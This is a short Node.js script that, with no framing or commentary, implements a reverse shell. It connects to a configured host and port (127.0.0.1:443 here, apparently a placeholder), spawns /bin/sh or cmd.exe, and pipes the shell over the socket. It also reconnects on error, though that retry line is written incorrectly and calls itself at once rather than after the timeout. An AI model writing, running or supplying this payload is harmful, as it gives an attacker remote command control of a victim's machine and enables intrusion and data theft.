var os = require('os');
var net = require('net');
var path = require('path');
var child_process = require('child_process');

RHOST="127.0.0.1";
RPORT="443";
TIMEOUT=6000;

function reverseShell(HOST, PORT) {
    var server = new net.Socket();
    server.connect(PORT, HOST, function() {
        var shell_path = '/bin/sh';
        if (!os.platform().indexOf('win'))
            shell_path = path.join(process.env.windir, 'System32', 'cmd.exe');

        var cmd = child_process.spawn(shell_path);
        server.pipe(cmd.stdin);
        cmd.stdout.pipe(server);
		cmd.stderr.pipe(server);
    });
    server.on('error', function(error) {
        if (error.code === 'ECONNRESET')
            process.exit(0);
        setTimeout(reverseShell(HOST, PORT), TIMEOUT);
    });
}

reverseShell(RHOST, RPORT);
